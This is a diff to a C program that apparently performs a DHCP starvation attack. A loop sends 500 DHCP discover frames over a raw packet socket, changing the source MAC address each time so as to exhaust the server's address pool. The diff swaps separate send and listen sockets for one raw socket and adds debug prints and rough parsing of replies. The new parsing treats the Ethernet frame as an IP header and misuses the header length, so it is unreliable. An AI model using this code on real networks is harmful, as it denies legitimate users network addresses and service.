@@ -141,8 +141,7 @@ void make_discover(unsigned char* buffer, unsigned char* src_mac_addr, int type)
 }
 
 void cleanup(int sig) {
-  if (send_socket)              close(send_socket);
-  if (listen_socket)            close(listen_socket);
+  if (sd)              close(sd);
   signal(sig, SIG_IGN);
   exit(EXIT_SUCCESS);
 }
@@ -152,8 +151,8 @@ int main(int argc, char **argv) {
   char* interface_name = checkArgs(argc, argv); // get name of the interface
   srand(time(NULL));  // pseudo generate IP id and DHCP transaction xid
 
-  if ((send_socket = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
-    err ("Failed to create socket", send_socket, 0);
+  if ((sd = socket (PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+    err ("Failed to create socket", sd, 0);
   }
   uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
   uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
@@ -189,18 +188,8 @@ int main(int argc, char **argv) {
 
   // place here only parts which depends on source MAC address, src mac address
   // has to be changed in every iteration to starve the dhcp server
-  if((listen_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
-    err ("Failed to create SOCK_DGRAM", listen_socket, 0);
-  }
-  struct sockaddr_in srv;
-  bzero(&srv, sizeof(struct sockaddr_in));
-  srv.sin_family = AF_INET;
-  srv.sin_addr.s_addr = INADDR_ANY;     // dont care
-  srv.sin_port = htons(68);  // 68
-
-  if((bind(listen_socket, (struct sockaddr *)&srv, sizeof(srv))) < 0) {
-    err ("Failed to bind listen socket", ERR, 0);
-  }
+  struct sockaddr saddr;
+  socklen_t length = sizeof(saddr);
 
   for (size_t i = 0; i < 500; i++) {
     increment_mac_addr(src_mac_addr);
@@ -214,28 +203,24 @@ int main(int argc, char **argv) {
     memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
     // fire
     int sent = 0;
-    if ((sent = sendto (send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
+    if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
       err("sendto() failed", sent, 0);
     }
     bzero(&buffer, DHCP_BUFFER_SIZE);
-    socklen_t length = sizeof(struct sockaddr_ll);
-    int rcvd = 0; // receive data and decive what to do
-    if((rcvd = recvfrom(listen_socket, buffer, DHCP_BUFFER_SIZE, 0, (struct sockaddr *)&interface, &length)) < 0) {
-      err("Err in recvfrom", rcvd, 0);
+    printf("WAITING\n");
+    int rcvd = 0;
+    if((rcvd = recvfrom(sd, eth_frame, eth_msg_len, 0, &saddr, &length)) <0) {
+      err("recvfrom() failed", rcvd, 0);
     }
-    printf("received\n");
-    if (buffer[242] == 2) {
-      printf("TODO\n");
-    }
-    make_discover(buffer, src_mac_addr, 1);  // fill buffer with discover msg
-    memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));
-    sent = 0;
-    if ((sent = sendto (send_socket, eth_frame, eth_msg_len, 0, (struct sockaddr *)&interface, sizeof(interface))) <= 0) {
-      err("sendto() failed", sent, 0);
+    printf("RECEIVED\n");
+    struct ip* rcv_ip = (struct ip*) eth_frame;
+    if (rcv_ip->ip_p == IPPROTO_UDP) {
+      //struct udphdr *udph = (struct udphdr*)(eth_frame + rcv_ip->ip_hl);
+      printf("UDP %d\n",eth_frame[rcv_ip->ip_hl + sizeof(udphdr)] );
     }
   }
-  if ((close(send_socket) < 0) || (close(listen_socket) < 0)) {
-    err("Failed to close the socket", send_socket, 0);
+  if (close(sd) < 0) {
+    err("Failed to close the socket", sd, 0);
   }
   free(udp_header);
   free(ip_header);
